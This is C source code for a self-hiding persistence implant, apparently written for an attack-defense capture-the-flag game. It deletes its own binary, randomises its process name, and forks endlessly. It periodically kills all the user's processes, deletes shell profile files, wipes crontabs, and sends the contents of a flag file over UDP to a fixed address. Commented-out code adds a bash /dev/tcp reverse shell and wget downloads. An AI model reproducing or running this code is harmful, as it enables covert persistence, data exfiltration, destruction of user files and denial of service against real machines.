#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h> 
#include <sys/prctl.h>
#include <sys/socket.h>
#include <signal.h>
#include <netinet/in.h>
#include <arpa/inet.h>

# define GET_FLAG 		50000
# define CLEAN_HORSE	10000
# define CHECK_HORSE	10000
# define REV_SHELL		80000

# define DESTPORT_SHELL		9999
# define DESTPORT_FLAG		8888
# define DESTIP			"127.0.0.1"
# define FLAG_FILE		"/home/test/flag"
# define SERVER			"http://127.0.0.1:1234/"
unsigned int count;
char File_list[10][50] = {"/home/test/.bashrc", "/home/test/.bash_aliases", "/home/test/.bash_profile", "/home/test/.profile", 0};
//struct timespec last_mtim[2];
//unsigned int create_flag;

void delete_self(){
	unsigned int f;
	unsigned char file[100]={0};
	f = open("/proc/self/cmdline",0);
	read(f,file,99);
	close(f);
	remove(file);
	return;
}

void change_name(int argc, char** argv){
	unsigned int f;
	unsigned char newname[9] = {0};
	f = open("/dev/urandom",0);
	read(f,newname,8);
	close(f);
	prctl(PR_SET_NAME, newname);
	strcpy(argv[0], newname);
	return;
}

void get_flag(){
	unsigned int sock;
	unsigned int f;
	struct sockaddr_in servaddr;
	char buf[100]={0};

	if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
		exit(0);
	
	memset(&servaddr, 0, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_port = htons(DESTPORT_FLAG);
	servaddr.sin_addr.s_addr = inet_addr(DESTIP);
	
	f = open(FLAG_FILE);
	read(f, buf, 100);

	sendto(sock, buf, strlen(buf), 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
	exit(0);
}

void check(){
	int i = 0;
	while(strlen(File_list[i])){
		if(!access(File_list[i], 0)){
			remove(File_list[i]);
		}
		i++;
	}
	system("crontab -r 2>/dev/null");
	exit(0);
}

/*
void recover(){
	//create .bashrc && bash_aliases
	unsigned char cmd[100];
	snprintf(cmd, "wget %s%s -o %s", SERVER, "bashrc", "~/.bashrc");
	system(cmd);
	snprintf(cmd, "wget %s%s -o %s", SERVER, "bash_aliases", "~/.bash_aliases");
	system(cmd);
	exit(0);
}
*/

/*
void rev_shell(){
	char cmd[100];
	sprintf(cmd, "bash -i >& /dev/tcp/%s/%d 0>&1", DESTIP, DESTPORT_SHELL);
	system(cmd);
	exit(0);
}
*/

void horse(int argc, char** argv){
BEGIN:	
	change_name(argc, argv);
	unsigned int p;

	if(count % CLEAN_HORSE == 0)
		kill(-1, SIGKILL);

	if(count % CHECK_HORSE == 0){
		if(!fork()){
			//create_flag = 1;
			check();
			exit(0);
		}
	}

	if(count % GET_FLAG == 0){
		if(!fork()){
			get_flag();
			exit(0);
		}
	}
	/*
	if(count % REV_SHELL == 0){
		if(!fork()){
			rev_shell();
			exit(0);
		}
	}
	*/
	count++;

	p = fork();
	while(p < 0 ) 
		p = fork();
	if(!p){
		goto BEGIN;
	}
	exit(0);
}

void main(int argc, char* argv[]){
	count = 0;
	unsigned int p;
	
	delete_self();

	p = fork();
	if(p < 0) exit(0);
	if(!p){
		horse(argc, argv);
	}
	exit(0);
}
